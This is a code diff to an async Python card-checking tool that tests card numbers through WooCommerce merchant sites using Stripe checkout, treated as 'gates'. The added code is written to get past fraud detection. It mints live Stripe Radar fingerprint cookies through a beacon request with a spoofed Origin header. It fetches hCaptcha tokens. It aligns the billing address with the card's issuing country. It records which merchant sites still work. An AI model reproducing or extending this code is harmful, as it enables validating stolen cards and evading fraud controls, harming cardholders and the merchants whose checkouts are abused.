@@ -53,6 +53,18 @@ def bin_summary(binfo: dict) -> str:
     return out or "?"
 
 
+def bin_alpha2(binfo: dict) -> str:
+    """Страна эмитента из любого формата ответа; '' если не определена."""
+    if not binfo:
+        return ""
+    c = binfo.get("country") or binfo.get("Country")
+    if isinstance(c, dict):
+        return (c.get("alpha2") or c.get("Alpha2") or "").upper()
+    if isinstance(c, str) and len(c.strip()) == 2:
+        return c.strip().upper()
+    return ""
+
+
 def load_ready_gates() -> list[dict]:
     candidates = ["data/ready_gates.json", "ready_gates.json"]
     for path in candidates:
@@ -154,6 +166,9 @@ class GateSession:
         self.legacy_nonce = ""
         self.telem: dict | None = None
         self.account_email = ""
+        # Sprint 1 state: живые Radar-cookie и hcaptcha-токен
+        self.hcaptcha_token: str | None = None
+        self.stripe_cookies: dict = {"mid": "", "sid": ""}
 
     async def open(self) -> tuple[bool, str]:
         base = self.u["base"]
@@ -203,15 +218,31 @@ class GateSession:
             self.pk = scraped["pk"]
             self.upe_nonce = scraped["upe_nonce"]
             self.legacy_nonce = scraped["legacy_nonce"]
-            self.telem = gc.stripe_telemetry(base, scraped["pk"])
 
-            # 4. Префетч fingerprint-cookie m.stripe.com/6 (Radar score)
+            # 3b. hcaptcha_token для radar_options (fallback — шлём без токена)
+            donor_host = base.replace("https://", "").replace("http://", "")
+            self.hcaptcha_token = await gc.fetch_hcaptcha_radar_token(s, self.pk, donor_host)
+
+            # 4. Beacon POST m.stripe.com/6 — сервер минтует живые muid/guid/sid (Radar)
+            live_ids = {"muid": "", "sid": "", "guid": ""}
             try:
-                await s.get("https://m.stripe.com/6",
-                            headers={"Origin": base, "Referer": f"{base}/", "Accept": "*/*"},
-                            timeout=5)
+                r_m = await s.post("https://m.stripe.com/6",
+                                   data=gc.m_stripe_beacon_payload(),
+                                   headers={"Origin": "https://js.stripe.com",
+                                            "Referer": "https://js.stripe.com/", "Accept": "*/*"},
+                                   timeout=6)
+                if r_m.status_code == 200:
+                    live_ids = gc.parse_m_stripe_response(r_m.json())
             except Exception:
                 pass
+            self.stripe_cookies = {"mid": live_ids["muid"], "sid": live_ids["sid"]}
+
+            self.telem = gc.stripe_telemetry(base, scraped["pk"],
+                                             muid=live_ids["muid"], sid=live_ids["sid"])
+            if live_ids["guid"]:
+                self.telem["guid"] = live_ids["guid"]
+            if self.hcaptcha_token:
+                self.telem["_hcaptcha_token"] = self.hcaptcha_token
             return True, ""
         except Exception as e:
             await _close_session(s)
@@ -233,16 +264,18 @@ class GateSession:
             return False
 
     async def _confirm_setup_intent(self, pm_id: str) -> dict | None:
+        attribution = gc.wc_attribution_fields(self.u["base"])
         if self.upe_nonce:
             body = {
                 "action": "wc_stripe_create_and_confirm_setup_intent",
                 "_ajax_nonce": self.upe_nonce,
                 "wc-stripe-payment-method": pm_id,
                 "wc-stripe-payment-type": "card",
+                **attribution,
             }
             url = self.u["ajax_url"]
         else:
-            body = {"stripe_source_id": pm_id, "nonce": self.legacy_nonce}
+            body = {"stripe_source_id": pm_id, "nonce": self.legacy_nonce, **attribution}
             url = f"{self.u['base']}/?wc-ajax=wc_stripe_create_setup_intent"
         try:
             r = await self.s.post(url, data=body,
@@ -252,9 +285,14 @@ class GateSession:
         except Exception:
             return None
 
-    async def check_card(self, card_raw: str) -> dict:
+    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
         card = gc.parse_card(card_raw)
-        tok_body = gc.tokenize_body(card, self.telem, self.u["base"])
+        # Гео-выравнивание billing по BIN карты (Sprint 1.3): адрес держателя
+        # подстраивается под страну эмитента, имя остаётся от сессии.
+        telem = dict(self.telem)
+        if bin_alpha2 and bin_alpha2.upper() != (self.telem.get("country") or "US").upper():
+            telem.update(gc.geo_identity_fields(bin_alpha2))
+        tok_body = gc.tokenize_body(card, telem, self.u["base"])
 
         try:
             r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
@@ -424,7 +462,7 @@ async def main():
                     print(f"    [+] Session opened on {dom} (acct {gs.account_email})", flush=True)
 
                 t0 = time.perf_counter()
-                res = await gs.check_card(c)
+                res = await gs.check_card(c, bin_alpha2=bin_alpha2(bins.get(c.split("|")[0][:6], {})))
                 latency_ms = int((time.perf_counter() - t0) * 1000)
                 if not custom_donor:
                     update_gate_health(dom, not res.get("retry_next_gate"))
